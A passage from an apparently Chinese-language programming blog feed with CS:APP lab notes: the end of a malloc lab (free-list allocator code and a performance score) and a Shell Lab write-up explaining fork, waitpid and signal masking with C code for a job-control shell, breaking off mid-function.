class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printlist</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;FREE LIST\n&quot;</span>);<br>    <span class="hljs-type">void</span> *cur = FP;<br>    <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (cur) &#123;<br>        <span class="hljs-type">void</span> *nxt = <span class="hljs-built_in">GET_NEXT</span>(cur);<br>        <span class="hljs-type">int</span> sz = <span class="hljs-built_in">GET_SIZE</span>(cur);<br>        <span class="hljs-type">int</span> al = <span class="hljs-built_in">GET_ALLOC</span>(cur);<br>        <span class="hljs-type">int</span> sp = <span class="hljs-built_in">SPACE</span>(sz);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pointer: %x, size: %x, space: %x, alloc: %x\n&quot;</span>, (<span class="hljs-type">uintptr_t</span>)cur, sz, sp, al);<br>        cur = nxt;<br>        cnt++;<br>        <span class="hljs-keyword">if</span> (cnt &gt; <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printlog</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;log START: %x, END: %x\n&quot;</span>, (<span class="hljs-type">uintptr_t</span>)START, (<span class="hljs-type">uintptr_t</span>)END);<br>    <span class="hljs-type">void</span> *cur = START;<br>    <span class="hljs-keyword">while</span> (cur &lt; END) &#123;<br>        <span class="hljs-type">int</span> sz = <span class="hljs-built_in">GET_SIZE</span>(cur);<br>        <span class="hljs-type">int</span> al = <span class="hljs-built_in">GET_ALLOC</span>(cur);<br>        <span class="hljs-type">int</span> sp = <span class="hljs-built_in">SPACE</span>(sz);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pointer: %x, size: %x, space: %x, alloc: %x\n&quot;</span>, (<span class="hljs-type">uintptr_t</span>)cur, sz, sp, al);<br>        cur += sz;<br>    &#125;<br>    <span class="hljs-built_in">printlist</span>();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// printf(&quot;init\n&quot;);</span><br>    <span class="hljs-built_in">mem_deinit</span>();<br>    <span class="hljs-built_in">mem_init</span>();<br>    <span class="hljs-comment">// 初始化数据结构</span><br>    <span class="hljs-comment">// 确保初始化</span><br>    START = (<span class="hljs-type">void</span>*)(<span class="hljs-built_in">ALIGN</span>((<span class="hljs-type">uintptr_t</span>)<span class="hljs-built_in">mem_heap_lo</span>()));<br>    END = START;<br>    FP = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">mem_sbrk</span>(START - <span class="hljs-built_in">mem_heap_lo</span>());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-comment">// printf(&quot;MALLOC: %x\n&quot;, size);</span><br>    <span class="hljs-comment">// 确保开始时ALIGN的</span><br>    <span class="hljs-comment">// 隐含p也是ALIGN的</span><br>    <span class="hljs-comment">// 增加同样是ALIGN的 </span><br>    <span class="hljs-type">void</span> *tmp = FP;<br>    <span class="hljs-keyword">while</span> (tmp) &#123;<br>        <span class="hljs-type">void</span> *nxt = <span class="hljs-built_in">GET_NEXT</span>(tmp);<br>        <span class="hljs-type">size_t</span> sz = <span class="hljs-built_in">GET_SIZE</span>(tmp);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SPACE</span>(sz) &gt;= size) &#123;<br>            <span class="hljs-comment">// 移除队列</span><br>            <span class="hljs-built_in">del_p</span>(tmp);<br>            <span class="hljs-type">size_t</span> tar = <span class="hljs-built_in">FULL_SIZE</span>(size);<br>            <span class="hljs-keyword">if</span> (sz - tar &gt;= <span class="hljs-built_in">FULL_SIZE</span>(ALIGNMENT)) &#123;<br>                <span class="hljs-built_in">set_blk</span>(tmp, tar);<br>                <span class="hljs-built_in">set_blk</span>(tmp + tar, sz - tar);<br>                <span class="hljs-built_in">insert_head</span>(tmp + tar);<br>            &#125;<br>            <span class="hljs-built_in">SET</span>(tmp);<br>            <span class="hljs-comment">// printlog(); </span><br>            <span class="hljs-keyword">return</span> tmp + FILL;<br>        &#125;<br>        tmp = nxt;<br>    &#125;<br>    <span class="hljs-type">size_t</span> sz = <span class="hljs-built_in">FULL_SIZE</span>(<span class="hljs-built_in">ALIGN</span>(size));<br>    <span class="hljs-built_in">mem_sbrk</span>(sz);<br>    <span class="hljs-built_in">set_blk</span>(END, sz);<br>    <span class="hljs-built_in">SET</span>(END);<br>    END += sz;<br>    <span class="hljs-comment">// printlog();</span><br>    <span class="hljs-keyword">return</span> END - sz + FILL;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_p</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> </span>&#123;<br>    <span class="hljs-comment">// printf(&quot;del: %x\n&quot;, (uintptr_t)p);</span><br>    <span class="hljs-type">void</span> *prev = <span class="hljs-built_in">GET_PREV</span>(p);<br>    <span class="hljs-type">void</span> *nxt = <span class="hljs-built_in">GET_NEXT</span>(p);<br>    <span class="hljs-keyword">if</span> (prev == <span class="hljs-literal">NULL</span> &amp;&amp; nxt == <span class="hljs-literal">NULL</span>) &#123;<br>        FP = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (prev == <span class="hljs-literal">NULL</span>) &#123;<br>        FP = nxt; <br>        <span class="hljs-built_in">PUT_PREV</span>(FP, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <br>    <span class="hljs-keyword">if</span> (nxt == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">PUT_NEXT</span>(prev, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">PUT_NEXT</span>(prev, nxt);<br>    <span class="hljs-built_in">PUT_PREV</span>(nxt, prev);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 只维护链表结构</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">combine</span><span class="hljs-params">(<span class="hljs-type">void</span> *p1, <span class="hljs-type">void</span> *p2)</span> </span>&#123;<br>    <span class="hljs-type">size_t</span> sz = <span class="hljs-built_in">GET_SIZE</span>(p1) + <span class="hljs-built_in">GET_SIZE</span>(p2);<br>    <span class="hljs-built_in">del_p</span>(p1); <br>    <span class="hljs-built_in">del_p</span>(p2);<br>    <span class="hljs-built_in">set_blk</span>(p1, sz);<br>    <span class="hljs-built_in">insert_head</span>(p1);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-type">void</span> *head = ptr - FILL;<br>    <span class="hljs-comment">// printf(&quot;free: %x\n&quot;,(uintptr_t)head); </span><br>    <span class="hljs-type">void</span> *cur = head;<br>    <span class="hljs-type">void</span> *nxt = head + <span class="hljs-built_in">GET_SIZE</span>(head);<br>    <span class="hljs-comment">// combine的时候用到的信息在这里被覆盖了</span><br>    <span class="hljs-built_in">PUT</span>(head, <span class="hljs-built_in">GET_SIZE</span>(head));<br>    <span class="hljs-built_in">insert_head</span>(head);<br>    <span class="hljs-keyword">if</span> (head &gt; START) &#123;<br>        <span class="hljs-type">void</span> *last = head - <span class="hljs-built_in">GET_SIZE</span>(head - FOOTER);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GET_ALLOC</span>(last)) &#123;<br>            <span class="hljs-built_in">combine</span>(last, cur);<br>            cur = last;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nxt &lt; END) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GET_ALLOC</span>(nxt)) &#123;<br>            <span class="hljs-built_in">combine</span>(cur, nxt);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printlog();</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *oldptr = ptr;<br>    <span class="hljs-type">void</span> *newptr;<br>    <span class="hljs-type">size_t</span> copySize;<br>    <br>    newptr = <span class="hljs-built_in">mm_malloc</span>(size);<br>    <span class="hljs-keyword">if</span> (newptr == <span class="hljs-literal">NULL</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// 根据保存的大小信息</span><br>    copySize = (<span class="hljs-type">size_t</span>)<span class="hljs-built_in">SPACE</span>(ptr);<br>    <span class="hljs-keyword">if</span> (size &lt; copySize)<br>      copySize = size;<br>    <span class="hljs-built_in">memcpy</span>(newptr, oldptr, copySize);<br>    <span class="hljs-built_in">mm_free</span>(oldptr);<br>    <span class="hljs-keyword">return</span> newptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="result">Result</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Team</span> Name:ateam<br><span class="hljs-attribute">Member</span> <span class="hljs-number">1</span> :Harry Bovik:bovik@cs.cmu.edu<br><span class="hljs-attribute">Using</span> default tracefiles in ../traces/<br><span class="hljs-attribute">Perf</span> index = <span class="hljs-number">44</span> (util) + <span class="hljs-number">9</span> (thru) = <span class="hljs-number">53</span>/<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h2 id="小结">小结</h2><h3 id="满分思路">满分思路</h3>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Shell Lab记录</title>
    <link href="/2023/07/05/shell/"/>
    <url>/2023/07/05/shell/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="系统调用">系统调用</h2><p>C提供了异常处理，比提供了全局变量 errno（int），作为错误类型。</p><p>注意main函数中 if (pid == 0) { xxx }的部分是子进程运行的代码。而main中剩余部分与Handler都属于父进程，其中包括所有对jobs的维护操作。</p><p>每次执行系统调用结束，从内核态转换态，包括进程结束等过程，每次Switch到当前进程时，都会检查一下signal，同时调用对应的handler。</p><p>使用sig_set作为signal的数据结构，而不是是队列，因此并不知道有多少子进程发送了信号，handler一般要借助while函数处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error: %s\n&quot;</span>, strerror(errno));<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br># 获得pid号<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getppid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br># 退出当前进程（the calling process），并返回父进程定义的status<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span>;<br><br><span class="hljs-meta"># status Running Stopped Terminated </span><br><br># 创建进程，除了pid，同样的Copy (包括PC)<br><span class="hljs-type">int</span> pid = fork(); <br><span class="hljs-meta"># call once, return twice，对于创建进程和子进程不同，子进程返回的pid即为0（自身）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br>    # 作为区分进程的参数，一份代码即可<br>    pid = Fork();<br><span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">/* Child */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child : x=%d\n&quot;</span>, ++x);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br> <span class="hljs-comment">/* Parent */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: x=%d\n&quot;</span>, --x);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br># 输出child <span class="hljs-number">2</span>, parent <span class="hljs-number">0</span><br><br><span class="hljs-meta"># terminated后系统不会回收该进程，成为僵尸进程，直到被父进程Reaped回收。</span><br># 内核为所有父进程terminated但未Reaped的进程提供了init进程，PID为<span class="hljs-number">1</span>。<br><br><span class="hljs-meta"># waidpid，与子进程的交互，同时代表reaped</span><br><span class="hljs-meta"># pid = -1 所有子进程，*statusp &amp;status，可以判断是正常退出WIFEXITED，WIFSIGNALED，由于发送的信号终止，Returns true <span class="hljs-keyword">if</span> the child process terminated because of a signal that was not caught （offending signal)，WIFSTOPPED，由于子进程停止引起的handler。</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">waitpid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> *statusp, <span class="hljs-type">int</span> options)</span>;<br># Returns: PID of child <span class="hljs-keyword">if</span> OK, <span class="hljs-number">0</span> (<span class="hljs-keyword">if</span> WNOHANG), or −<span class="hljs-number">1</span> on error<br><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> WNOHANG was specified and one or more child(ren) specified by pid exist, but have not yet changed state, then 0 is returned</span><br></code></pre></td></tr></table></figure><h2 id="同步异步">同步异步</h2><p>Main函数 与Handler函数，类似于多重中断处理的过程，需要考虑两者运行的先后顺序以及发生中断的时间。由于没有PV的信号量机制，HandlerA B的先后顺序需要在A运行前屏蔽B的信号。</p><p>由于A的结束为导致B不再运行，还需要借助sigsuspend(&amp;mask)(暂时开中断，直到中断结束) 确保所有子进程都被处理。</p><ol type="1"><li>handler最好暂时保存全局变量errno，防止影响main函数的判断。</li><li>async-signal-safe function不会被打断的函数，一般指可以通过单个微指令 (?)完成的指令，参考CPU对系统调用的中断处理。</li><li>处理全局变量前block all</li><li>volatile int g不读reg（单进程的编译器可能优化，不再访存），借助声明可以强制访存，用于同步。</li><li>sig_atomic_t原子操作赋值，可以不用block，注意不能flag++，同时读和写。</li></ol><h1 id="具体流程">具体流程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> &#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS]; <span class="hljs-comment">/* Argument list execve() */</span><br>    <span class="hljs-type">char</span> buf[MAXLINE]; <span class="hljs-comment">/* Holds modified command line */</span><br>    <span class="hljs-type">int</span> bg; <span class="hljs-comment">/* Should the job run in bg or fg? */</span><br>    <span class="hljs-type">int</span> jid;<br>    <span class="hljs-type">pid_t</span> pid; <span class="hljs-comment">/* Process id */</span><br>    <span class="hljs-type">sigset_t</span> mask_all, mask_one, prev_one;<br>    sigfillset(&amp;mask_all);<br>    sigemptyset(&amp;mask_one);<br>    sigaddset(&amp;mask_one, SIGCHLD);<br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    bg = parseline(buf, argv);<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">/* Ignore empty lines */</span><br><br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123;<br>        <span class="hljs-comment">// 同步 先add 后 delete </span><br>        <br>        <span class="hljs-comment">// 需要在handler可能出现之前先block</span><br>        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);<br>        <span class="hljs-keyword">if</span> ((pid = fork()) == <span class="hljs-number">0</span>) &#123; <br>            <br>            <span class="hljs-comment">// 需要确保group与当前shell不同</span><br>            setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            <br>            <span class="hljs-comment">// 子进程开block，不影响execve的运行</span><br>            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);  <br>            <br>            <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-comment">// 注意exit()</span><br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br><br> <br>        <span class="hljs-keyword">if</span> (!bg) &#123;<br>            <span class="hljs-comment">// 对全局变量进行写操作，block all 可以确保不会被其他的handler影响。</span><br>            sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);<br>            addjob(jobs, pid, FG, cmdline);<br>            <span class="hljs-comment">// add完可以开block</span><br>            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);<br>            waitfg(pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);<br>            addjob(jobs, pid, BG, cmdline);<br>            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);<br>            jid = pid2jid(pid);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, jid, pid, cmdline);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>)) <span class="hljs-comment">/* quit command */</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>))&#123;<br>        listjobs(jobs);    <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <br>    <span class="hljs-keyword">if</span> ((!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>)) || (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>)))&#123;<br>        do_bgfg(argv); <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* Not a builtin command */</span><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> pid, jid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">cj</span>;</span><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) &#123;<br>        jid = atoi(argv[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>);<br>        cj = getjobjid(jobs, jid); <br>        <span class="hljs-keyword">if</span> (cj == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such job\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">return</span>; <br>        &#125;<br>        pid = cj-&gt;pid;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]))&#123;<br>        pid = atoi(argv[<span class="hljs-number">1</span>]);<br>        cj = getjobpid(jobs, pid);<br>        <span class="hljs-keyword">if</span> (cj == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, pid);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        jid = cj-&gt;jid;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;b&#x27;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, jid, pid, cj-&gt;cmdline);<br>        <span class="hljs-comment">// 注意负数，kill所有同组的进程。</span><br>        kill(-pid, SIGCONT);<br>        cj-&gt;state = BG;<br>    &#125;            <br>    <span class="hljs-keyword">else</span> &#123;<br>        kill(-pid, SIGCONT); <br>        cj-&gt;state = FG;<br>        waitfg(pid);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 建议waitpid只出现在一个函数中</span><br><span class="hljs-comment">// while (fgpid(jobs)&gt;0)</span><br><span class="hljs-comment">//sigsuspend(&amp;masktemp);</span><br><span class="hljs-comment">// 注意这里有问题，需要先block子进程，否则若在while判断完成，进入sigsuspend前handler已经处理过了，就会导致一直等待。</span><br><span class="hljs-comment">// 这里也体现出同异步的问题很容易被忽略。</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span> &#123;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">sigset_t</span> mask_all, prev_all;<br>    sigfillset(&amp;mask_all);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">cj</span> =</span> getjobpid(jobs, pid);<br>    <span class="hljs-type">int</span> jid = cj-&gt;jid;<br>    <span class="hljs-keyword">if</span> (waitpid(pid, &amp;status, WUNTRACED) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);<br>            deletejob(jobs, cj-&gt;pid);<br>            sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> 